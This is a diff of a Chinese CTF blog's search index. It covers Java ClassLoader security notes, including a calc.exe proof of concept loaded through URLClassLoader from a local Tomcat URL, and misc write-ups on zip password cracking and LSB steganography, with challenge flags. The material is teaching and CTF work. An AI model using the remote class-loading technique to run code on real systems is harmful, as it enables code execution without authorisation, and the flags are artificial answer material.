<span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>); </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123; </span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>各种压缩包的加密</title>
+    <url>/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/</url>
+    <content><![CDATA[<p>拿到附件，查看了下四个加密压缩包，貌似分别代表了不同的加密方式</p>
+<p>第一个a.zip</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image002.gif" class="" title="图片">
 
+<p>看了下有三个文件，1.txt，2.txt</p>
+<p>按照套路应该是CRC32爆破没错了，试试看</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image004.gif" class="" title="图片">
 
+<p>看到了两串很明显的字符，<em>pass_和_word</em></p>
+<p>所以压缩包密码应该就是_pass__word_，成功打开压缩包，得到1&#x2F;4张二维码，继续</p>
+<p>第二个f.zip</p>
+<p>根据压缩包的提示应该是可以直接爆破，先试试最常规的纯数字</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image006.gif" class="" title="图片">
 
-<h5 id="findclass-查找指定的Java类"><a href="#findclass-查找指定的Java类" class="headerlink" title="findclass(查找指定的Java类)"></a>findclass(查找指定的Java类)</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>五位数字爆破成功密码是61825</p>
+<p>第三个g.zip</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image008.gif" class="" title="图片">
 
+<p>根据文件名可以知道是明文爆破，这里由于会有一些压缩器的问题，所以就不分离出再进行压缩了，直接准备两个文件进行文件的删除</p>
+<p>删除到如下两幅图所示，相当于加密的和不加密的分离开</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image010.gif" class="" title="图片">
 
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image012.gif" class="" title="图片">
 
-<h5 id="findLoadedClass-查找JVM已经加载过的类"><a href="#findLoadedClass-查找JVM已经加载过的类" class="headerlink" title="findLoadedClass(查找JVM已经加载过的类)"></a>findLoadedClass(查找JVM已经加载过的类)</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass(String name) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!checkName(name))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> findLoadedClass0(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>进行明文爆破，成功</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image014.gif" class="" title="图片">
 
+<p>第四个压缩包l.zip</p>
+<p>打开就一个文件，可能会是伪加密，试试修改下16进制数据</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image016.gif" class="" title="图片">
 
+<p>能够解压</p>
+<p>这样四张分开的二维码图片就齐了，用PowerPoint拼起来看看，进行扫描</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image018.gif" class="" title="图片">
 
-<h5 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, off, len, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> &#123;</span><br><span class="line">        resolveClass0(c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="自定义类加载器-1"><a href="#自定义类加载器-1" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h4><p>在实际应用过程中，我们不仅仅只希望使用classpath当中指定的类或者jar包进行调用使用，我们有时希望调用本地磁盘文件或者网络还可以使用自定义类加载器的方式</p>
-<p>自定义类加载器步骤：</p>
-<ul>
-<li>继承classloader类</li>
-<li>覆盖findclass()方法</li>
-<li>在findClass()方法中调用defineClass()方法</li>
-</ul>
-<h5 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h5><p>URLClassLoader类继承ClassLoader类，可以加载本地磁盘和网络中的jar包类文件。</p>
-<p>我们在创建了一个Main.java文件，写了一段calc.exe计算机弹窗代码。如果文件被成功解析执行，会输出Test calc success！！！字段且弹出计算器。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Test calc success!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;cmd /c calc.exe&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们利用javac编译生成对应的.class文件</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230319235739048.png" alt="image-20230319235739048"></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\Javaeeworkspce\\javasecurity\\src\\main\\java\\org\\example&quot;</span>);</span><br><span class="line">        <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> file.toURI();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> uri.toURL();</span><br><span class="line"></span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;org.example.Main&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>我们可以看出成功的弹出了计算器</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230320000050159.png" alt="image-20230320000050159"></p>
-<h5 id="网络传输class文件调用"><a href="#网络传输class文件调用" class="headerlink" title="网络传输class文件调用"></a>网络传输class文件调用</h5><p>我们将Test.class放置到电脑的Tomcat服务器目录下(tomcat&#x2F;webapps&#x2F;),然后新建个ClassLoaderTest类网络加载Tomcat服务器中的Main.class</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8080/examples/&quot;</span>);</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;org.example.Main&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Main.java中还有一段输出Test calc success!!!这里截图失误了</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230320001511079.png" alt="image-20230320001511079"></p>
-<p>参考文章：</p>
-<p><a href="https://www.cnblogs.com/luckforefforts/p/13642685.html">java中双亲委派机制(+总结） - luwanglin - 博客园 (cnblogs.com)</a></p>
-<p><a href="https://xz.aliyun.com/t/9002#toc-9">JAVA安全基础（一）–类加载器（ClassLoader） - 先知社区 (aliyun.com)</a></p>
+<p>得到flag，flag{d62427d8f843c98dcfa89f0ba0d1e6fe}</p>
 ]]></content>
       <categories>
         <category>笔记</category>
-        <category>web笔记</category>
+        <category>misc笔记</category>
       </categories>
       <tags>
-        <tag>web</tag>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -2795,54 +2843,6 @@
       </categories>
       <tags>
         <tag>其它</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>各种压缩包的加密</title>
-    <url>/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/</url>
-    <content><![CDATA[<p>拿到附件，查看了下四个加密压缩包，貌似分别代表了不同的加密方式</p>
-<p>第一个a.zip</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image002.gif" class="" title="图片">
-
-<p>看了下有三个文件，1.txt，2.txt</p>
-<p>按照套路应该是CRC32爆破没错了，试试看</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image004.gif" class="" title="图片">
-
-<p>看到了两串很明显的字符，<em>pass_和_word</em></p>
-<p>所以压缩包密码应该就是_pass__word_，成功打开压缩包，得到1&#x2F;4张二维码，继续</p>
-<p>第二个f.zip</p>
-<p>根据压缩包的提示应该是可以直接爆破，先试试最常规的纯数字</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image006.gif" class="" title="图片">
-
-<p>五位数字爆破成功密码是61825</p>
-<p>第三个g.zip</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image008.gif" class="" title="图片">
-
-<p>根据文件名可以知道是明文爆破，这里由于会有一些压缩器的问题，所以就不分离出再进行压缩了，直接准备两个文件进行文件的删除</p>
-<p>删除到如下两幅图所示，相当于加密的和不加密的分离开</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image010.gif" class="" title="图片">
-
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image012.gif" class="" title="图片">
-
-<p>进行明文爆破，成功</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image014.gif" class="" title="图片">
-
-<p>第四个压缩包l.zip</p>
-<p>打开就一个文件，可能会是伪加密，试试修改下16进制数据</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image016.gif" class="" title="图片">
-
-<p>能够解压</p>
-<p>这样四张分开的二维码图片就齐了，用PowerPoint拼起来看看，进行扫描</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image018.gif" class="" title="图片">
-
-<p>得到flag，flag{d62427d8f843c98dcfa89f0ba0d1e6fe}</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>misc笔记</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -2941,7 +2941,7 @@
 <p>​    print(“     To use this python script , you must install the tshark first.”)</p>
 <p>​    print(“     You can use <code>sudo apt-get install tshark</code> to install it”)</p>
 <p>​    print(“Author : “)</p>
-<p>​    print(“     WangYihang <a href="mailto:&#x77;&#97;&#110;&#x67;&#121;&#x69;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;">&#x77;&#97;&#110;&#x67;&#121;&#x69;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;</a>“)</p>
+<p>​    print(“     WangYihang <a href="mailto:&#119;&#97;&#x6e;&#103;&#121;&#x69;&#x68;&#97;&#110;&#103;&#101;&#114;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#111;&#109;">&#119;&#97;&#x6e;&#103;&#121;&#x69;&#x68;&#97;&#110;&#103;&#101;&#114;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#111;&#109;</a>“)</p>
 <p>​    print(“     If you have any questions , please contact me by email.”)</p>
 <p>​    print(“     Thank you for using.”)</p>
 <p>​    exit(1)</p>
@@ -2980,6 +2980,101 @@
 <p>发现了这一串，作为密码，解出！</p>
 <img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc%20ez_usb/wps6.jpg" class="" title="img"> 
 
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2022国赛初赛 misc2 everlasting_night</title>
+    <url>/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/</url>
+    <content><![CDATA[<p>下载附件，是一张图片，拖入winhex并没有太大的发现，后来得到提示以后，仔细看了一下stegsolve中图片的内容。</p>
+<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps7.jpg" class="" title="img"> 
+
+<p>在这里发现了一点线索，于是data extract</p>
+<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps8.jpg" class="" title="img"> 
+
+<p>在这里发现了一串可疑字符串，题目提示，可以配合lsb隐写，那就将这个作为密码，用lsb脚本运行解密（lsb脚本为github的脚本）</p>
+<p><a href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a></p>
+<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps9.jpg" class="" title="img"> 
+
+<p>得到out.txt，拖入winhex看到了PK</p>
+<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps10.jpg" class="" title="img"> 
+
+<p>修改后缀为zip，发现压缩包需要密码，离答案肯定很近了！</p>
+<p>这里花了很久，找不到任何东西，发现提示有一句被漏掉了（仔细观察png数据块）</p>
+<p>随便找了一张正常的png照片对比了一下</p>
+<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps11.jpg" class="" title="img"> 
+
+<p>这是正常的</p>
+<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps12.jpg" class="" title="img"> 
+
+<p>这是本题的，明显发现最后这一串是多出来的，手动敲出来</p>
+<p>FB3EFCE4CEAC2F5445C7AE17E3E969AB，发现并不是密码，但是应该就是它很可疑，进行解码，终于，在md5这找到了密码</p>
+<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps13.jpg" class="" title="img"> 
+
+<p>拿到了文件，拖入winhex</p>
+<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps14.jpg" class="" title="img"> 
+
+<p>发现又是张图片，修改后缀，发现不对。想到了一个之前收集的强大工具gimp，将文件后缀名改成data拖进去</p>
+<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps15.jpg" class="" title="img"> 
+
+<p>出了！，可以看清楚flag，左右移动一下，手动敲就出来了</p>
+<p>flag{607f41da-e849-4c0b-8867-1b3c74536cc4}</p>
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>强网青少赛miscWP</title>
+    <url>/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/</url>
+    <content><![CDATA[<h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><p>下载附件，发现是一张打不开的图片，拖进010看看</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image002.gif" class="" title="图片">
+
+<p>发现是base64码，先去在线网站解码看看</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image004.gif" class="" title="图片">
+
+<p>发现应该是一张png，但是每两位都被交换了位置，于是用脚本解码并转换16进制</p>
+<p>from binascii import *</p>
+<p>from base64 import *</p>
+<p>with open(‘chuyinweilai.png’, ‘r’) as f:</p>
+<p>  hexdata &#x3D; b64decode(f.read())</p>
+<p>  b_data &#x3D; b’’</p>
+<p>  for i in range(0, len(hexdata), 2):</p>
+<p>   data &#x3D; hexdata[i:i+2]</p>
+<p>   b_data +&#x3D; data[::-1]</p>
+<p>  with open(‘flag.png’, ‘wb’) as f1:</p>
+<p>   f1.write(b_data)</p>
+<p>得到图片</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image006.gif" class="" title="图片">
+
+<p>图片提示密钥就是音乐的财富密码，说明图片具有密钥，上网搜一下</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image008.gif" class="" title="图片">
+
+<p>密钥应该就是4536251，outguess和steghide都不是，想起来有个lsb解密也需要密钥，试一试</p>
+<p>python2 lsb.py extract flag.png 1.txt 4536251</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image010.gif" class="" title="图片">
+
+<p>得到1.txt，打开得到flag</p>
+<p>flag{5cc0aa21208b517dbd0bde650247237f}</p>
+<h1 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h1><p>下载附件</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image012.gif" class="" title="图片">
+
+<p>又是lsb隐写，先拖入010看看</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image014.gif" class="" title="图片">发现了一张png和password，先binwalk分离
+
+<p>有密码的图片，还是试试lsb.py</p>
+<p>python2 lsb.py extract secret.png 1.txt 7his_1s_p4s5w0rd</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image016.gif" class="" title="图片">打开1.txt得到flag，
+
+<p>flag{2e55f884-ef01-4654-87b1-cc3111800085}</p>
 ]]></content>
       <categories>
         <category>比赛</category>
@@ -3161,50 +3256,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2022国赛初赛 misc2 everlasting_night</title>
-    <url>/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/</url>
-    <content><![CDATA[<p>下载附件，是一张图片，拖入winhex并没有太大的发现，后来得到提示以后，仔细看了一下stegsolve中图片的内容。</p>
-<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps7.jpg" class="" title="img"> 
-
-<p>在这里发现了一点线索，于是data extract</p>
-<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps8.jpg" class="" title="img"> 
-
-<p>在这里发现了一串可疑字符串，题目提示，可以配合lsb隐写，那就将这个作为密码，用lsb脚本运行解密（lsb脚本为github的脚本）</p>
-<p><a href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a></p>
-<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps9.jpg" class="" title="img"> 
-
-<p>得到out.txt，拖入winhex看到了PK</p>
-<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps10.jpg" class="" title="img"> 
-
-<p>修改后缀为zip，发现压缩包需要密码，离答案肯定很近了！</p>
-<p>这里花了很久，找不到任何东西，发现提示有一句被漏掉了（仔细观察png数据块）</p>
-<p>随便找了一张正常的png照片对比了一下</p>
-<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps11.jpg" class="" title="img"> 
-
-<p>这是正常的</p>
-<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps12.jpg" class="" title="img"> 
-
-<p>这是本题的，明显发现最后这一串是多出来的，手动敲出来</p>
-<p>FB3EFCE4CEAC2F5445C7AE17E3E969AB，发现并不是密码，但是应该就是它很可疑，进行解码，终于，在md5这找到了密码</p>
-<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps13.jpg" class="" title="img"> 
-
-<p>拿到了文件，拖入winhex</p>
-<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps14.jpg" class="" title="img"> 
-
-<p>发现又是张图片，修改后缀，发现不对。想到了一个之前收集的强大工具gimp，将文件后缀名改成data拖进去</p>
-<img src="/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc2%20everlasting_night/wps15.jpg" class="" title="img"> 
-
-<p>出了！，可以看清楚flag，左右移动一下，手动敲就出来了</p>
-<p>flag{607f41da-e849-4c0b-8867-1b3c74536cc4}</p>
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>welpwn</title>
     <url>/2022/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_welpwn/</url>
     <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道ret2libc，但是涉及相邻两个栈帧的利用。</p>
@@ -3254,57 +3305,6 @@
       </categories>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>强网青少赛miscWP</title>
-    <url>/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/</url>
-    <content><![CDATA[<h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><p>下载附件，发现是一张打不开的图片，拖进010看看</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image002.gif" class="" title="图片">
-
-<p>发现是base64码，先去在线网站解码看看</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image004.gif" class="" title="图片">
-
-<p>发现应该是一张png，但是每两位都被交换了位置，于是用脚本解码并转换16进制</p>
-<p>from binascii import *</p>
-<p>from base64 import *</p>
-<p>with open(‘chuyinweilai.png’, ‘r’) as f:</p>
-<p>  hexdata &#x3D; b64decode(f.read())</p>
-<p>  b_data &#x3D; b’’</p>
-<p>  for i in range(0, len(hexdata), 2):</p>
-<p>   data &#x3D; hexdata[i:i+2]</p>
-<p>   b_data +&#x3D; data[::-1]</p>
-<p>  with open(‘flag.png’, ‘wb’) as f1:</p>
-<p>   f1.write(b_data)</p>
-<p>得到图片</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image006.gif" class="" title="图片">
-
-<p>图片提示密钥就是音乐的财富密码，说明图片具有密钥，上网搜一下</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image008.gif" class="" title="图片">
-
-<p>密钥应该就是4536251，outguess和steghide都不是，想起来有个lsb解密也需要密钥，试一试</p>
-<p>python2 lsb.py extract flag.png 1.txt 4536251</p>
